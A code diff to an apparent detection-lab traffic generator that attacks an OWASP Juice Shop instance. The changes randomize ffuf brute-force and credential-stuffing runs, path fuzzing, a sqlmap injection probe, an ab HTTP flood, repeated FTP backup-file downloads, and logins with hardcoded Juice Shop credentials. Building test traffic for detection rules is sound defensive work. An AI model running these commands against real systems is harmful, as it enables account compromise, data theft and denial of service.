@@ -26,10 +26,13 @@ blue()  { printf '\033[1;34m%s\033[0m\n' "$*"; }
 
 scenario_brute_force() {
     blue "[*] Scenario: brute_force — ffuf login brute force"
+    # Shuffle wordlists to randomize the sequence of guesses
+    shuf "$USERS" > /tmp/users_shuf.txt
+    shuf "$PASSWORDS" > /tmp/passwords_shuf.txt
     ffuf -u "${TARGET}/rest/user/login" \
         -X POST -H "Content-Type: application/json" \
         -d '{"email":"FUZZ","password":"FUZ2"}' \
-        -w "$USERS:FUZZ" -w "$PASSWORDS:FUZ2" \
+        -w "/tmp/users_shuf.txt:FUZZ" -w "/tmp/passwords_shuf.txt:FUZ2" \
         -mc all -t 4 -rate 10 \
         2>&1 || true
     green "[+] brute_force complete"
@@ -37,10 +40,12 @@ scenario_brute_force() {
 
 scenario_credential_stuffing() {
     blue "[*] Scenario: credential_stuffing — Fast multi-user spray"
+    shuf "$USERS" > /tmp/users_shuf.txt
+    shuf "$PASSWORDS" > /tmp/passwords_shuf.txt
     ffuf -u "${TARGET}/rest/user/login" \
         -X POST -H "Content-Type: application/json" \
         -d '{"email":"FUZZ","password":"FUZ2"}' \
-        -w "$USERS:FUZZ" -w "$PASSWORDS:FUZ2" \
+        -w "/tmp/users_shuf.txt:FUZZ" -w "/tmp/passwords_shuf.txt:FUZ2" \
         -mc all -t 16 -rate 40 \
         2>&1 || true
     green "[+] credential_stuffing complete"
@@ -48,7 +53,8 @@ scenario_credential_stuffing() {
 
 scenario_web_scan() {
     blue "[*] Scenario: web_scan — ffuf path fuzzing"
-    ffuf -u "${TARGET}/FUZZ" -w "$PATHS" \
+    shuf "$PATHS" > /tmp/paths_shuf.txt
+    ffuf -u "${TARGET}/FUZZ" -w "/tmp/paths_shuf.txt" \
         -mc all -fc 301 \
         -t 10 -rate 20 \
         -H "User-Agent: Mozilla/5.0 (compatible; Scanner/1.0)" \
@@ -58,7 +64,10 @@ scenario_web_scan() {
 
 scenario_sqli() {
     blue "[*] Scenario: sqli — sqlmap SQL injection probe"
-    sqlmap -u "${TARGET}/rest/products/search?q=test" \
+    # Randomize the search parameter targeted by sqlmap
+    TERMS=("apple" "orange" "juice" "test" "admin" "user")
+    TERM="${TERMS[$RANDOM % ${#TERMS[@]}]}"
+    sqlmap -u "${TARGET}/rest/products/search?q=${TERM}" \
         --batch --level=1 --risk=1 \
         --random-agent \
         --tamper=space2comment \
@@ -70,33 +79,40 @@ scenario_sqli() {
 
 scenario_http_flood() {
     blue "[*] Scenario: http_flood — ab HTTP flood"
+    # Randomly select a target endpoint to flood
+    ENDPOINTS=("/" "/api/Products" "/rest/languages" "/#/search")
+    TARGET_ENDPOINT="${ENDPOINTS[$RANDOM % ${#ENDPOINTS[@]}]}"
     ab -t 30 -c 50 \
         -H "User-Agent: Mozilla/5.0 (compatible; LoadBot/1.0)" \
-        "${TARGET}/" \
+        "${TARGET}${TARGET_ENDPOINT}" \
         2>&1 || true
     green "[+] http_flood complete"
 }
 
 scenario_data_exfiltration() {
     blue "[*] Scenario: data_exfiltration — Download FTP files"
-    # Hit known Juice Shop FTP files repeatedly to generate large byte transfers
-    for i in $(seq 1 20); do
-        curl -s -o /dev/null -w "GET /ftp/acquisitions.md -> %{http_code} (%{size_download} bytes)\n" \
-            "${TARGET}/ftp/acquisitions.md" || true
-        curl -s -o /dev/null -w "GET /ftp/coupons_2013.md.bak -> %{http_code} (%{size_download} bytes)\n" \
-            "${TARGET}/ftp/coupons_2013.md.bak" || true
-        curl -s -o /dev/null -w "GET /ftp/package.json.bak -> %{http_code} (%{size_download} bytes)\n" \
-            "${TARGET}/ftp/package.json.bak" || true
+    # Randomize the number of downloads and randomly select files
+    FILES=("acquisitions.md" "coupons_2013.md.bak" "package.json.bak" "suspicious_errors.yml")
+    NUM_DOWNLOADS=$(( (RANDOM % 15) + 15 ))
+    for i in $(seq 1 $NUM_DOWNLOADS); do
+        FILE="${FILES[$RANDOM % ${#FILES[@]}]}"
+        curl -s -o /dev/null -w "GET /ftp/$FILE -> %{http_code} (%{size_download} bytes)\n" \
+            "${TARGET}/ftp/$FILE" || true
     done
     green "[+] data_exfiltration complete"
 }
 
 scenario_account_takeover() {
     blue "[*] Scenario: account_takeover — Successful login from high-risk IP"
-    # The normalizer maps the attacker IP (172.30.0.10) to "RU".
-    # A successful login from RU triggers the account_takeover Sigma rule.
+    # Randomly select a valid Juice Shop credential pair
+    CREDS=(
+        '{"email":"admin@juice-sh.op","password":"admin123"}'
+        '{"email":"bender@juice-sh.op","password":"bender"}'
+        '{"email":"jim@juice-sh.op","password":"ncc-1701"}'
+    )
+    SELECTED_CRED="${CREDS[$RANDOM % ${#CREDS[@]}]}"
     curl -s -X POST -H "Content-Type: application/json" \
-        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+        -d "$SELECTED_CRED" \
         "${TARGET}/rest/user/login" > /dev/null
     green "[+] account_takeover complete"
 }
